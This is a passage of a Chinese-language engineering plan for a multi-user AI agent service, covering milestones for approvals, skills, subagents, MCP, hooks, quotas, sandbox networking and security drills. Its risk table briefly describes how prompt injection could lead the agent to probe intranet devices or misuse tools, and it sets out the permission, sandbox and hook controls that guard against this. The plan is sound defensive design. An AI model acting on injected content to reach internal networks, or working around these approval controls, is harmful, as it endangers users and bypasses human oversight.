| T8.1 | `hitl/`：`interrupt` 表 + `raise_interrupt`（写库→`INTERRUPT_RAISED`→Future 等待）+ resolve（校验用户、幂等、唤醒）+ timeout→expired | e2e：ask→resolve→循环恢复；重复 resolve 幂等；超时置 expired | ⬜ |
| T8.2 | 权限接入：`ask` → `type=permission` interrupt → once/session/拒绝；拒绝回灌为模型可读的错误 + 建议规则；崩溃恢复（pending 重启后仍可 resolve） | e2e + 重启测试（进程重启后同一 interrupt 可 resolve，run 继续） | ⬜ |
| T8.3 | `builtin/ask.py`：`ask_user`（1-4 问、选项、multiSelect、Other 自由文本） | 单测：payload schema、答案回灌格式 | ⬜ |
| T8.4 | `enter_plan_mode`/`exit_plan_mode`：plan 审批 interrupt（含 plan 文本）+ 批准后 mode 切换（会话级，非配置） | e2e：plan→批准→写工具解禁；拒绝→留在 plan | ⬜ |
| T8.5 | 前端审批 UI：`ApprovalDialog`（工具/目标/diff 摘要/风险 + **once / session 两档** + "复制建议规则"按钮）、待办角标、重连后恢复 pending、取消按钮 | 手动验证 + vitest（store 状态迁移） | ⬜ |
| T8.6 | 运行中引导：`/threads/{id}/steer` + loop 在 turn 边界注入 + 前端输入不阻塞 | e2e：长 run 中追加指令被采纳 | ⬜ |

### M9 Skills（文件即配置）

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T9.1 | `skills/frontmatter.py`：解析/校验（name、description、when_to_use、allowed_tools、model、version），slug 规则、正文大小上限 | 单测：缺字段、非法 YAML、slug 冲突报 error | ⬜ |
| T9.2 | `SkillIndex` 进 snapshot：扫 `config/skills/` + `config/plugins/*/skills/`，内容 sha256 变更 → reload 后新 version 生效；thread 启动时读当前快照 | 单测：改文件→reload→index 更新；未 reload 时旧快照不变（不撕裂） | ⬜ |
| T9.3 | progressive disclosure：system 只带索引（name/description/when_to_use）；`skill_load(name)` 返回正文 + 附属文件清单（只读、限 workspace/skill 目录） | e2e：先 load 再执行；system token 不随 skill 数量线性膨胀 | ⬜ |
| T9.4 | skill↔permissions 交叉校验：frontmatter 的 `allowed_tools` 必须 ∈ snapshot 启用工具集；越界引用在 `make config-check` 报 error（**运行时不再授权任何权限**） | 故意引用被 `tools.yaml` 关掉的工具 → config-check 非零退出 | ⬜ |
| T9.5 | 示例 skills 2 个（`code-review`、`pdf-notes`）+ `docs/skills.md`（写法、评审清单、常见错） | 端到端用 skill 完成一次任务；文档步骤可复现 | ⬜ |

### M10 Subagents

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T10.1 | `subagents/defs.py`：`config/agents/<name>.md` frontmatter（name、description、tools/exclude_tools、model、max_turns、permission_mode、timeout_s）→ `AgentIndex` 进 snapshot；非法工具名/越界 model 在 config-check 报错 | 单测：非法 tools 报错、默认值继承 settings、bypass mode 被 policy 拒 | ⬜ |
| T10.2 | `task` 工具 + `spawn.py`：子 `run(parent_run_id)`、独立 context（只带 prompt）、depth/并发/wall-clock 预算护栏、`task` 默认从子工具集排除 | 集成：父→子→结果作为 tool_result；depth 超限被拒 | ⬜ |
| T10.3 | `forward.py`：子事件带 `source_run_id` 汇入父流；子权限请求上抛给同一用户；父取消传播到子 | e2e：同一 SSE 里看到子流并在父级弹窗审批；取消父即停子 | ⬜ |
| T10.4 | `todo_write` 工具（thread 级 TODO）+ 前端 TracePanel（父子 run 树、耗时、token、事件时间线、`config_version` 显示） | 手动 + 单测（todo 状态机） | ⬜ |

### M11 MCP

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T11.1 | 依赖 `mcp` SDK；`mcp/config.py`：`config/mcp.yaml` → `MCPPlan`（stdio command+args+env、http url+headers、`requires_approval`、`enabled`、`connect_timeout_s`），secret 仅 `${env:}` | 单测：配置校验、缺 env 报错清晰、路径越界拒绝 | ⬜ |
| T11.2 | `mcp/clients.py`：生命周期（连接、`initialize`、`tools/list`、**结果缓存在内存**、重连退避、健康状态、lifespan 优雅关闭）；失败 server 降级为 disabled 并写 `ConfigIssue`/report | 集成：官方示例 stdio server 连上并列工具；kill 后重连；启动失败不阻塞服务 | ⬜ |
| T11.3 | `mcp/bridge.py`：`mcp__<server>__<tool>` 注册、schema 透传、结果（text/image/resource）归一化 + 截断/spill、错误→`TOOL_CALL_FAILED`、annotations(`readOnlyHint`/`destructiveHint`) → **默认权限**（不自动放行） | e2e：模型调用 MCP 工具拿到结果；destructive 默认询问 | ⬜ |
| T11.4 | `mcp/elicitation.py`：server→client elicitation 映射为 interrupt；`sampling` 明确 unsupported（返回清晰错误而非静默） | e2e：elicitation 走前端审批并回填；sampling 请求返回预期错误 | ⬜ |
| T11.5 | `GET /mcp/status` 只读端点（server/状态/工具数/last_error）+ `docs/mcp.md`（加 server 的改动清单 = 改 `mcp.yaml` + reload；信任边界；排障） | 按文档手动接入一个真实 server；status 与 report 一致 | ⬜ |

### M12 Hooks + Plugins

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T12.1 | `hooks/types.py` + `bus.py`：事件枚举（SessionStart、UserPromptSubmit、PreToolUse、PostToolUse、PostToolUseFailure、PermissionRequest、PermissionDenied、SubagentStart/Stop、PreCompact/PostCompact、Stop）、matcher、outcome 合并规则（block 优先、modify 串行）、由 snapshot 构建；无 hook 时零开销 | 单测：合并优先级、matcher 命中、零开销路径 | ⬜ |
| T12.2 | `hooks/command.py`：stdin JSON / stdout JSON / exit 0·2 语义、超时（默认 10s）、`on_timeout: block\|allow`、stdout 大小限制、argv 直传不经 shell、脚本路径与可写性校验（§8.7） | 集成：阻断某工具、注入 context、两种超时策略；world-writable 脚本被拒 | ⬜ |
| T12.3 | hook 接入 loop 各挂点 + `HOOK_*` 事件 + `tool_call`/`audit_log` 记录；PreToolUse deny 时模型收到可理解原因 | e2e：`HOOK_BLOCKED` 出现在流上且模型正确解释 | ⬜ |
| T12.4 | `plugins/manifest.py` + `discover.py`：`.vanilla-plugin/plugin.json` 校验（name/version/min_service_version/skills/agents/mcpServers/hooks/tools/pythonEntryPoints）、`config/plugins.yaml` 的 enabled/trusted、资源标签归属 | 单测：版本不满足拒装、trusted=false 时忽略 entry point、manifest 引用越界报错 | ⬜ |
| T12.5 | `plugins/registrar.py` + `loader.py`：`register(registrar)` 协议（add_tool/add_hook/add_skill_source/add_mcp_server），贡献全部进 snapshot；reload = 快照替换，**在跑的 run 不受影响** | 集成：带自定义工具的 fixture 插件；reload 前后同一 run 继续且工具集不变 | ⬜ |
| T12.6 | 示例插件（command hook + skill + MCP server 声明各一）+ `docs/plugins.md`（评审清单：什么改动需要 trusted、hook 能拿到什么数据） | 端到端装配并演示 | ⬜ |

### M13 上下文管理与硬化

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T13.1 | 精确 token 预算：按 provider usage 校准估算、`context_window` 水位、超限前预检；`settings.yaml` 提供 window/阈值 | 单测：水位单调、估算偏差 <15%（对照 usage fixture） | ⬜ |
| T13.2 | `agent/compaction.py`：阈值触发（默认 80%）+ 手动 `/compact`、保留 pinned 首条 + 最近 N 轮、摘要写 `compaction` 表 + `CONTEXT_COMPACTED`、PreCompact hook | 集成：长对话压缩后仍能正确续答；`event_log` 不被破坏 | ⬜ |
| T13.3 | tool 输出治理：per-tool 字节上限（snapshot）、spill artifact + 前端"查看完整输出"、敏感字段 redact | 单测 + 手动 | ⬜ |
| T13.4 | 用量与配额（开放注册的兜底闸门，§8.10）：`/usage/summary`（当前用户 + 预算余量）、per-user `daily_token_budget`（CLI 改）超限 → run failed + 事件、per-user `max_concurrent_runs`（默认 1）、**`global_hourly_tokens` 账户级熔断**（跨用户聚合，超限后所有新 run 直接 429 且发 `ERROR` 事件 + `audit_log`）、**`sandbox.max_live_containers` + LRU 空闲回收 + 超限 429** | e2e：三层上限各自的触发路径；关键用例 —— "10 个用户各自不超 per-user 预算但合计击穿 `global_hourly_tokens`" 时第 11 个 run 被拒（这条是单 key 架构的存在性测试，不许省略） | ⬜ |
| T13.5 | 稳定性：错误码表收口、`event_log` retention 裁剪、`scripts/db_backup.py`（stdlib sqlite3 backup API）、优雅关闭（等 run 落终态；pending interrupt 保留可恢复）、reload 与关闭时的快照语义文档化 | 集成 + 重启演练：无悬挂 run 假状态、备份可读 | ⬜ |
| T13.6 | 部署：按 §8.4 的形态 —— **service 作为宿主机进程**（`deploy/vanilla-agent.service` systemd 单元 + `uv run uvicorn --workers 1`，靠它经 `docker` CLI 驱动沙箱），`docker-compose.yml` 只含 web（+ 可选示例 MCP server 与反代）；**不出现 `/var/run/docker.sock` 挂载**。`.env.example`、`README` 快速开始、`Makefile` 全目标；web 侧只访问 service 的 HTTP 面。**部署文档必须把"要不要公网开放注册"写成显式的、需要部署者确认的一步**（`config-check` 在 `registration.open=true` 且监听非 loopback 时报 error，§8.11），并说明 `sandbox.network_mode` 三档各自的暴露面（缺省 `none`；`per_user_bridge` 是**需要显式开启的放宽**，代价 = 沙箱可达同网段内网设备，开启前要在 `docs/deploy.md` 里勾选确认） | 干净机器：`systemd` 起 service + `docker compose up` 起 web → 端到端对话；`grep -r docker.sock deploy/` 无命中；`--workers 1` 与 §12 单进程约束一致；`kill -HUP` 后配置生效且 run 不中断；公网模拟监听 + open=true 时 `config-check` 报错 | ⬜ |
| T13.7 | 安全审查：逐条核 §8（越权、symlink、SSRF、secret 泄漏、CSRF、bypass policy、**配置目录写权限演练**：以 service 身份尝试改 `config/permissions.yaml` 应失败）。r3 新增三项演练：① **无 admin 的越权面** —— 枚举所有返回数据的端点，断言不存在可用他人 id 作参数的查询（`/capabilities` 外一律按 principal 取数）；② **注册滥用演练** —— 脚本批量注册 50 账号并各起 1 个 run，验证 per-IP 限速、`max_live_containers`、`global_hourly_tokens` 三道闸门各自在预期位置拦住且错误可读；③ **网络模式演练（D8 之后的新形态）** —— 三档各跑一次，断言缺省即 `none`（不设任何 local 覆盖时容器 `getent hosts`/出网全失败）、`internal` 下出网失败、`per_user_bridge` 下跨用户仍不可达；**并跑一次"全程无网冒烟"**：在 `none` 下走完 建号→对话→read/write/grep/bash→工具审批 的完整链路，任何一步偷偷依赖网络（镜像缺工具、pip 拉包、DNS 查询）都算缺陷；同时确认 `http_fetch`（host 侧，不受容器网络模式约束）的不对称已写进文档（T6.7） | 三项演练各有可重复脚本；findings 清零或转为新 TODO | ⬜ |

### 延后（v1.1+，不在本计划审批范围）

管理控制台（**当前架构下无对应 API，若要做得先推翻 ADR-015**）、后台 bash 任务与 `bash_output`、MCP resources、跨 run 长期记忆、worktree 隔离、OTel/Langfuse 追踪、多节点调度、配置变更的 git-PR 自动化（现在只给建议片段）。

---

## 10. 测试与质量策略

| 层 | 做法 |
|---|---|
| 配置 | `tests/fixtures/configs/` 下多套目录（valid/冲突/缺 env/引用不存在的工具/world-writable/明文密钥），`make config-check` 与 pytest 双跑；reload 不撕裂快照有专门用例 |
| 模型 | `ScriptedModelClient` 让 loop 完全离线可测；`chat.completions` chunk 录成 fixture 测归一化；真实调用只在 `VANILLA_RUN_LIVE=1` 的 smoke 脚本 |
| 沙箱 | 单测用 `FakeSandbox`（断言 argv/env/timeout）；`@pytest.mark.docker` 打真实容器；无 daemon 自动 skip 并在报告里说明 |
| MCP | 官方 SDK 的 in-memory/stdio 示例 server 作 fixture |
| API/e2e | `httpx.AsyncClient(transport=ASGITransport)` + 内存 SSE 解析器，覆盖"发消息→工具→审批→终态→断线重放" |
| 前端 | `vitest`（reducer/store/sse 解帧）+ `tsc --noEmit` strict；Playwright 冒烟视时间在 M13 决定 |
| 静态 | `ruff check` + `ruff format --check` + `mypy app`（strict 逐步收紧）；`make gen-ts` 漂移即失败；`make config-check` 纳入 lint 目标 |
| 覆盖目标 | `config/`、`agent/`、`permissions/`、`sandbox/`、`workspace/paths.py`、`auth/` ≥ 85%；§3 不变量每条 ≥1 用例（含第 7 条"零配置写入"用 grep 式守卫测试） |
| 回归护栏 | 每个 bug 先加失败用例；本文件验证列写具体命令，避免"看起来能跑" |

---

## 11. 运行形态

```
make dev            # uvicorn app.main:app --reload (:8000) + next dev (:3000)
make test           # pytest -q（docker 用例按可用性 skip）
make config-check   # 配置校验 + 密钥扫描 + 引用完整性（改配置后必跑）
make sandbox-build  # 构建沙箱镜像 vanilla-agent/sandbox:<tag>
make gen-ts         # 事件 DTO → web/src/types/generated
docker compose up   # 生产形态：service + web（config 目录只读挂载）
```

`./data/` 布局：`vanilla.db`（含 WAL）、`artifacts/<sha[0:2]>/<sha>`、`workspaces/<user_id>/`、`backups/`。
关键 env（部署面）：`OPENAI_API_KEY`、`SECRET_*`（供配置里 `${env:}` 引用）、`SESSION_COOKIE_SECURE`、`SESSION_TTL_DAYS`、`ALLOW_LOCAL_SANDBOX`、`CONFIG_ALLOW_LOCAL`、`SANDBOX_IMAGE`、`PUBLIC_BASE_URL`、`CONFIG_DIR`/`REPO_ROOT`。
**没有 `SECRET_MASTER_KEY`**（r1 里为 per-user secret 表加密而设，配置不入库后不再需要）。
**也没有 `SESSION_SECRET` / cookie signing key** —— ADR-004 的会话是 opaque `token_urlsafe(32)` + DB 存 sha256 的**查表式**校验，不存在需要 HMAC 签名的载荷；T0.2 的 fail-fast 列表里不得出现它（曾经的 r2 初稿写了这条，属于设计自相矛盾，已删）。
**T0.2 已落地**：部署面 env 的读取收口在 `app/core/env.py`（字段白名单由 `tests/unit/test_env.py` 钉死）；上表中的 `PUBLIC_BASE_URL` 待其消费者出现时再加入。仓库根 `.env.example` 模板已提前落地（原属 T13.6 交付项；T0.4 的 hygiene 用例负责钉死"模板可跟踪、真值被忽略"）。

---

## 12. 风险与缓解

| 风险 | 影响 | 缓解 |
|---|---|---|
| 改配置要 reload/重启，迭代慢 | 运维摩擦、误以为改了没生效 | `kill -HUP <pid>` 即时生效（§7：不再有 HTTP reload 端点，因为无 admin 角色且开放注册）+ `python -m app.config dump` 显示 version/sources sha256 + run 记 `config_version` 可回查当时快照 + 日志打印 reload 结果；`config/README.md` 给"加一个能力要改哪几个文件"清单 |
| `config/` 写权限成为新的提权面（等价于改权限规则） | 一次误配（world-writable、容器可写挂载）= 能力可被篡改 | §8.7：只读挂载 + 属主检查 + world-writable 拒绝启动 + CI `config-check`；T13.7 演练"以 service 身份改配置必须失败" |
| 多环境配置漂移（`*.local.yaml` 不入库） | 线上行为与仓库不一致、难复现 | local 覆盖需显式 `CONFIG_ALLOW_LOCAL=1`；snapshot 记录每个来源的 sha256 并写进 `run.params_json`；report 可 diff |
| 无法 per-user 定制能力，所有用户共享一套（r3 起连 role 都没有） | 多租户场景受限（明确接受） | 写进 §1.2 非目标；将来若要 → 按"分组→多 `ConfigSnapshot`"扩展（配置仍是文件，只是允许 `settings.groups.<name>` 覆盖 enabled 集合），而不是回到 DB 配置或应用内角色 |
| provider key 全局共享 → 花费无法按用户区分账户（**§13-D2 已确认接受**） | 计费/隔离诉求落空；更糟的是"一个用户的花费吃掉所有人的额度" | `usage` 按 user 记 token（归属可查，只是钱出自同一账户）；**`global_hourly_tokens` 账户级熔断 + per-user `daily_token_budget`**双层（§8.10，T13.4 有专门的多用户合计击穿用例）；若将来真需要按用户计费 → 必须重开 per-user 凭据，与 ADR-015 冲突，属重新决策 |
| 装配面在启动期变重（连 MCP、扫 skills/agents、建 hook 总线） | 启动变慢、单个坏 server 拖垮启动 | 连接超时 + 失败降级为 disabled（T11.2）、启动并行化、report 里明确列出失败项 |
| Docker daemon 不可用 → 工具全部失效 | 开发/部署断裂 | `Sandbox` protocol + `FakeSandbox`（测试）与 `LocalSandbox`（dev，显式 env 开启）；启动探测给明确错误 |
| **开放注册 × 一把 key × 每人一个容器**（§13-D3 的直接后果） | 陌生人批量开号 → 账户 token 被吃穿、宿主内存被容器耗尽、沙箱被拿去挖矿/当跳板 | 三道闸门（§8.10/§8.11）：注册 per-IP 限速与每日配额、`global_hourly_tokens` 熔断、`sandbox.max_live_containers` + LRU；`registration.open` 可关，且 `config-check` 在"公网监听 + open=true"时报 error，逼部署者显式确认 |
| **部署环境出网能力差异大**（公共 registry / 默认 PyPI 在部分环境不可达，需要 mirror 或代理） | `docker build`、容器内 `pip install`、`docker pull` 会在"网络明明已放开"的配置下静默失败，排障成本高 | mirror 源与基础镜像 tag 可配置注入（`apt_mirror`/`pip_index_url`/`base_image`，T6.3）+ 构建失败报错需指名失败源。缺省档 `none`（D8）下这条只影响 **build 期**与"显式开网络后"的运行期 |
| **放宽网络后沙箱可达同网段内网设备** | agent 经 prompt injection 可探测/攻击内网设备：路由器管理页、NAS、内网 HTTP 服务；这是"给容器开网络"最被低估的代价 | **缺省档为 `none`（D8）**，该风险仅在部署者显式改 `settings.yaml` + SIGHUP 后成立；bash 保持默认 `ask`；`http_fetch` 是 host 侧工具、不受容器网络模式约束，其 SSRF/allowlist 事实**写进文档不掩饰**（T6.7）；不在应用层假装做内网过滤 |
| **`none` 默认档的功能代价** | agent 不能 `pip install`/`npm i`/`git clone`；镜像缺的工具就是缺的；用户会看到"莫名其妙装不上依赖"的失败 | 工具链预烘焙进 `sandbox/image/Dockerfile`（T6.3）+ `docs/sandbox.md` 说明"加依赖 = 改 Dockerfile + `make sandbox-build`"；bash/命令失败时把 `ENETUNREACH`/`EAI_AGAIN` 翻译成"沙箱无网络，如需网络请改配置"的可读提示（T6.6）；网络模式是配置项不是运行时协商，切换要留审计 |
| 事件溯源数据膨胀 | DB 变大、重放变慢 | `visibility=internal` 分离、delta 批量落库（T2.3）、retention 裁剪（T13.5） |
| in-process run 监督与多 worker 冲突 | run 丢失/重复 | v1 强制单进程（启动时检测 `--workers>1` 即拒绝），ADR-014 |
| SSE 断线重放语义错乱 | UI 丢字/重复字 | cursor 全局单调 + 前端按 `(run_id,seq)` 去重 + `Last-Event-ID` 严格重放测试（T5.1） |
| 权限"自批"漏洞 | 提权 | 无 `always` 档、run 内不写规则文件、resolve 必须带用户身份、session grant 只在内存 + `audit_log`（T7.4/T8.2） |
| MCP/插件引入任意代码执行 | 服务权限泄漏 | trust 来自 `plugins.yaml`（需评审）+ command hook 无 shell + 脚本可写性校验 + 资源标签审计（T12.4/T12.5） |
| **mcp SDK 的依赖与导入面较大**（本仓库 37→61 包；client 入口会连带载入整个 `mcp.server` 代码树） | 传递依赖（含 `cryptography`，带原生绑定、历史 CVE 需跟踪）纳入长期审计；进程里存在我们不执行的 server 代码，误用面变大 | 影响可接受，**不设 import 级守卫**（该约束不可执行，见 ADR-007）。口径改为：不实现自己的 MCP server；`cryptography` 不作直接依赖；升级 mcp 前先看 `uv pip tree` 的增量与 `pyjwt[crypto]` 是否仍被 client 拉入 |
| prompt injection 通过抓取内容操纵工具 | 外泄/破坏 | §8.5 包裹标记 + 敏感工具默认 ask + SSRF 过滤 + 输出 redact |
| SQLite 写锁竞争 | 并发 run 下写延迟抖动；等待超过 `busy_timeout=5000ms` 时请求返回 5xx | 单写者 executor + WAL + busy_timeout + delta 批量落库 + per-user 并发上限 |
| **service 容器挂 `/var/run/docker.sock`** | socket == 宿主 root：service 一旦被攻陷即可起特权容器读走全部用户数据与 `vanilla.db`，§8.4 的跨用户隔离失效 | v1 让 service 跑在宿主机（systemd），compose 只装 web；必须容器化时改用受限 socket 代理 / 独立 rootless daemon（§8.4、T13.6） |
| **运行时数据与本地配置被误提交** | `pw_hash`、session token、对话正文、用户 agent 产物一旦进入 git 历史就长期可恢复，撤销成本远高于预防成本 | `.gitignore` 覆盖已落实（T0.1a）+ `git check-ignore` 守卫用例（T0.4）+ `config-check` 扫描未跟踪的 `*.local.yaml` |

---

## 13. 决策与开放问题

### 13.1 已决定（r3，2026-11-20 由用户确认；每条都能追溯到正文改动）

| # | 决定 | 落到哪 |
|---|---|---|
| **D1** | provider 只需 **`base_url` + `api_key` + `model_name` + 通用默认参数**（temperature/max_tokens/top_p/超时/重试/allowed_models）。**不接 Azure OpenAI**（api-version、deployment 路由、AAD token 都不实现） | ADR-001、§5 `settings.yaml`、T4.2 |
| **D2** | **凭据只有一把**（全局 env，`${env:OPENAI_API_KEY}` 引用）。接受"花费无法按用户区分账户" | ADR-001、ADR-015 代价句、§8.10、T13.4 |
| **D3** | **开放注册，且没有 admin 角色**（无邀请码、无首账号特权；`users.role` 取消；配额/禁用走运维 CLI） | ADR-004、ADR-011、§6、§7（无 `/admin/*`；reload→SIGHUP；`/config/report`→CLI；新增 `/capabilities`）、§8.2、§8.11、T1.8、T3.2、T3.3、T3.4、T13.7① |
| **D4** | `session` 授权存活边界**维持现定义**：同一 thread 内、进程重启或 reload（SIGHUP）即失效，不加额外 TTL | ADR-009、§4 `SessionGrantStore`、T7.4 |
| **D5** | **容器网络支持"设置为可访问"**（能力保留）：`settings.sandbox.network_mode` 三档；放宽档下必须每用户一张自定义网络（跨用户不可达与 `internal` 阻断出网都是 T6.4 的验收断言）；出网能力依赖部署环境，故 mirror 源可配置注入（主要影响 build 期） | ADR-005、§8.4、§12 风险行、T6.3、T6.4、T6.7、T13.7③ |
| **D8** | **缺省档 = `none`（最严，连内部 DNS 都不要）** —— 原则：默认状态不应把同网段内网设备纳入 agent 的可达面，开网络必须是显式、可审计的决定。连带三条硬要求：① 镜像必须预烘焙工具链（运行期装不了包）；② `none` 下网络类失败要被翻译成可读提示（T6.6）；③ 必须有一条"全程无网冒烟"，防止功能偷偷依赖网络（T13.7③）。放宽到 `internal`/`per_user_bridge` = 改 `settings.yaml` + `kill -HUP`，即每次开网络都是一次有记录的配置变更 | ADR-005、§5、§8.4、§12 两行、T1.5、T6.3、T6.4、T6.6、T13.7③ |
| **D6** | **配置变更工作流维持现设计**：审批时给"建议规则 YAML 片段"供人工提交，不做自动生成 patch 文件、不做 PR 自动化 | ADR-009、T7.5、T8.5 |

### 13.2 仍开放（不阻塞 M0，但都带明确的"什么时候必须回答"）

7. **`event_log` 保留期与 thread 导出**（JSON/Markdown）。→ 影响 T13.5；回答时机：retention 实现前。
8. **`cost_usd` 是否需要单价表**（provider 定价随模型变化）；v1 可只报 token。→ 影响 T13.4；回答时机：做 `/usage/summary` 时。
9. **公网部署时注册是否需要额外门禁**（邮箱验证 / 域名 allowlist / 手工审批首账号）。当前只有 per-IP 限速与每日配额（§8.11）——那是"减缓批量开号"，不是"只有真人能注册"。如果这服务会暴露到公网，这一条必须回答；只在受信任内网用可以先不答。→ 影响 T3.3/T3.4。
10. ~~部署环境的内网信任度假设~~ **已由 D8 关闭**：缺省档定为 `none`，放宽需显式改配置 + SIGHUP。衍生事项 —— "哪些工具链必须预烘焙进镜像"变成 `docs/sandbox.md` 里一份要长期维护的清单（T6.3），不再是"agent 自己 pip install 就行"的乐观假设。

### 13.3 此前轮次已关闭（保留以便追溯编号）

| # | 结论 | 落到哪 |
|---|---|---|
| **D7** | 部署形态：service 跑**宿主机**、`docker-compose.yml` 只装 web、**不挂 `/var/run/docker.sock`**（socket == 宿主 root）。将来若必须容器化 service，需单独评估受限 socket 代理，届时 T6.4 的沙箱交互层要回头适配 | ADR-005、§8.4、T13.6 |
| C1 | 首次提交前的仓库卫生：`.gitignore` 加固 + 下限收紧已落地并进入首个提交（T0.1a ✅）。遗留提醒：**空的 `service/tests/` 不被 git 跟踪**，第一个测试文件落地时才进版本库（T0.4 起自然产生） | §8.6、T0.1a、T0.4 |

---

## 14. 进度日志

> 这里只记**变更内容 + 在本文的落点**。决策理由、验证过程的叙述属于会话与评审记录，不写进仓库；仓库文件也不记录任何部署环境的具体信息（主机名 / IP / 资源规格 / 绝对路径 / 内网 mirror / 本地镜像名等）—— 规则见 CLAUDE.md「文档的隐私与可移植性」。

- **2026-11-17 r1**：初版规划，13 里程碑 / 69 TODO。四项选型：官方 mcp SDK、多用户 + 会话、Docker 沙箱隔离、前端 v1 = 聊天 + 审批（ADR-001…014）。
- **2026-11-20 r2**：装配面（skills / tools / subagents / MCP / plugins / permissions / hooks）全部改为仓库配置文件（ADR-015、§5）；DB 表 25→14（§6）；新增 M1 配置层；删除权限 `always` 档、`session` 授权改为进程内 TTL（ADR-009、§4）；里程碑 14 个。
- **2026-11-20 r2.1**（文档自审）：鉴权豁免改为显式白名单（§7）；CSRF 豁免登录/注册并明确 token 签发点（§8.3、T3.4）；`EventType` 改为合法 StrEnum 写法（§4）；删除无消费者的 `SESSION_SECRET`（§11）；部署形态定为 service 跑宿主机（§8.4、T13.6）；`.gitignore` 与依赖下限修正并入 T0.1；"空 `tests/` 时 pytest 退出码 5"写进验证门槛（T0.1/T0.4）。
- **2026-11-20 T0.1a ✅**：`.gitignore` 加固 + 依赖下限收紧到实际解析版本。验证见 T0.1a 行。
- **2026-11-20 r2.3 / T0.1b ✅**：新增 `pydantic-settings` / `pyyaml` / `mcp` 与 dev 工具链；补 `pytest-asyncio` 配置。验证见 T0.1b 行。
- **2026-11-20 r2.4**：撤销 T0.1c —— mcp 的 client 包在模块级 import server 代码树，import 级约束不可执行。结论落在 ADR-007 与 §12。
- **2026-11-20 r3**：六项开放问题定案（§13.1 D1–D6）。provider 仅 `base_url`/`api_key`/`model_name` + 通用参数、不接 Azure（ADR-001）；凭据全局一把（§8.10）；**开放注册且无 admin 角色**（ADR-004、§6、§7、§8.2、§8.11）；`session` 授权维持 thread 内（D4）；容器网络三档可配（D5）；配置变更维持"建议片段"（D6）。运维动作改走 shell（SIGHUP + CLI），用户侧新增脱敏 `GET /capabilities`。
- **2026-11-20 r3.1（D8）**：沙箱网络**缺省档定为 `none`**（§5、§8.4、T1.5 / T6.3 / T6.4 / T6.6 / T13.7③）。连带三条要求：镜像预烘焙工具链、网络失败可读化、必须有一条"全程无网冒烟"。§13 重组为 13.1 / 13.2 / 13.3。
- **2026-11-20 r3.2**：清除本文中的部署环境指纹与决策过程叙述，§14 重写为本变更索引；相应规则写入 CLAUDE.md。
- **2026-11-20 r3.3 / T0.2 ✅**：`app/core/env.py` 部署面 env 收口（白名单 + fail-fast + 路径锚定 `REPO_ROOT` + `.env` 装载）。验证见 T0.2 行。
- **待办**：M0 剩余 T0.3–T0.5；开放问题见 §13.2。
